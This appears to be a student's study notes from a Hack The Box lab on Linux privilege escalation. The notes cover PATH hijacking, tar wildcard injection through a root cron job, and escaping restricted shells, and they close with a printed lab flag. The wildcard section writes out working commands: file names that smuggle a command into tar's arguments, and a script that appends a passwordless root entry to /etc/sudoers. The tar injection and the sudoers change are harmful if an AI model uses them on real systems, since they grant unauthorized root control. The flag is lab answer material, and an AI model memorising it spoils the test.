# 🍯 Environment-based Privilege Escalation

[PATH](http://www.linfo.org/path\_env\_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.

```shell-session
echo $PATH
```

Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls)`

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls

PATH ABUSE!!
```

## Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions.\


<table data-header-hidden><thead><tr><th width="143"></th><th></th></tr></thead><tbody><tr><td><strong>Character</strong></td><td><strong>Significance</strong></td></tr><tr><td><code>*</code></td><td>An asterisk that can match any number of characters in a file name.</td></tr><tr><td><code>?</code></td><td>Matches a single character.</td></tr><tr><td><code>[ ]</code></td><td>Brackets enclose characters and can match any single one at the defined position.</td></tr><tr><td><code>~</code></td><td>A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td></tr><tr><td><code>-</code></td><td>A hyphen within brackets will denote a range of characters.</td></tr></tbody></table>

&#x20;the `tar` command, a common program for creating/extracting archives. In the man of the tar command we can see interesting stuff ->

```shell-session
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.)

Let's say we have a cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`.

```shell-session
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Then once the cronjob runs we can look at our new sudo privileges:

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

## Escaping Restricted Shells

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories.\
Some common examples of restricted shells include the `rbash` shell in Linux and the "Restricted-access Shell" in Windows.

* [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html\_node/The-Restricted-Shell.html) (`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories.
* [Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter. The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.
* [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.

### Escaping

Let's imagine the shell allows users to execute commands by passing them as arguments to a built-in command. In that case, it may be possible to escape from the shell by injecting additional commands into the argument.

Maybe the shell only allows us to execute the `ls` command with a specific set of arguments, such as `ls -l` or `ls -a`, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the `ls` command.

```shell-session
ElFelixi0@htb[/htb]$ ls -l `pwd` 
```

* Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command.
* In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (`;`) or a vertical bar (`|`), to execute a command.
* For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.
* In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.

_**Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.**_

```
htb-user@ubuntu:~$ echo "$(<flag.txt )"
HTB{35c4p3_7h3_r3stricted_5h311}
```
